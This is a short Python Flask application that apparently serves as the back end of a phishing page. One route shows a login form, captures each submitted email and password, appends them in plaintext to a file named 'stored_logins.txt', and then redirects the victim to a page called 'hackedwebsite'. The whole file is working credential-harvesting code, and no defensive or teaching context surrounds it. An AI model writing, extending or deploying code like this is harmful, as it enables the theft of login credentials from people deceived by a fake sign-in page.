from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route('/hehe_redir', methods=['POST', 'GET'])
def hehe_redir():
    if request.method == 'POST':
        # Handle POST request logic
        email = request.form['email']
        password = request.form['password']

        # Save the login data to a file or database
        with open('stored_logins.txt', 'a') as f:
            f.write(f'Email: {email}, Password: {password}\n')

        # Redirect to the hacked website or any other page
        return redirect(url_for('hacked_website'))
    else:
        # Handle GET request logic
        return render_template('hehe_redir.html')

@app.route('/hackedwebsite')
def hacked_website():
    return render_template('hackedwebsite.html')

@app.route('/hehe')
def hehe():
    return render_template('hehe.html')

if __name__ == '__main__':
    app.run(port=8000)

